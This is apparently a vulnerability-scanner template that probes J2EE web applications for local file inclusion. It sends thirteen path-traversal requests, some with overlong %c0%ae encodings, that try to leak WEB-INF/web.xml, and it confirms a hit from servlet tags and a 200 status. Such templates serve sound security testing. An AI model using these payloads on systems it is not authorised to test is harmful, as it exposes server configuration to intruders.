id: generic-j2ee-lfi
brief:
    title: Generic J2EE LFI Scan Panel - Detect
    by: davidfegyver
    level: high
    about: Generic J2EE Scan panel was detected. Looks for J2EE specific LFI vulnerabilities; tries to leak the web.xml file.
    label:
        - lfi
        - generic
        - j2ee
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/../../../../WEB-INF/web.xml'
        - '{{BaseURL}}/../../../WEB-INF/web.xml'
        - '{{BaseURL}}/../../WEB-INF/web.xml'
        - '{{BaseURL}}/%c0%ae/%c0%ae/WEB-INF/web.xml'
        - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
        - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
        - '{{BaseURL}}/../../../WEB-INF/web.xml;x='
        - '{{BaseURL}}/../../WEB-INF/web.xml;x='
        - '{{BaseURL}}/../WEB-INF/web.xml;x='
        - '{{BaseURL}}/WEB-INF/web.xml'
        - '{{BaseURL}}/.//WEB-INF/web.xml'
        - '{{BaseURL}}/../WEB-INF/web.xml'
        - '{{BaseURL}}/%c0%ae/WEB-INF/web.xml'
      signs:
        - "on": word
          has:
            - <servlet-name>
            - </web-app>
          in: body
          need: all
        - "on": status
          status:
            - 200
